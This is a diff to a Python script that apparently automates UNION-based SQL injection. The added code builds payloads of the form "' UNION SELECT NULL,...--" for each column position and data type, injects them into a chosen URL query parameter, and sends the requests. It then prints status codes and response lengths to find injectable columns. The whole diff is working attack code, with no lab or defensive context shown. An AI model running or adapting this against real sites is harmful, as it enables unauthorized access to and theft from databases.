@@ -58,4 +58,38 @@ for i in range(1, max_c+1):
 all_len = list(result_null.values())
 print(all_len)
 
-    
+
+
+print("\n=========")
+col_count = int(input("enter the number of col:"))
+
+tests = {
+    "string":"'dmDyCT'",
+    "int": "123",
+    "float": "3.14",
+    "bool": "TRUE",
+    "time": "2024-01-01",
+    "null": "NULL"
+}
+
+
+print("\n [+] testing...")
+
+for dtype, payload in tests.items():
+    print(f"\n[testing : {dtype}]")
+
+    for i in range(col_count):
+        col = ["NULL"] * col_count
+        col[i] = payload
+        inject = f"' UNION SELECT {','.join(col)}--"
+
+        test_params = query_params.copy()
+        test_params[edit_param] = [inject]
+        new_query = urlencode(test_params,doseq=True)
+        new_url = urlunparse(parse._replace(query=new_query))
+
+        try:
+            res = session.get(new_url)
+            print(f"[col {i+1}] payload : {inject} | status : {res.status_code} | lenght : {len(res.text)}")
+        except Exception as e:
+            print(f"[col {i+1}] error: {e}")
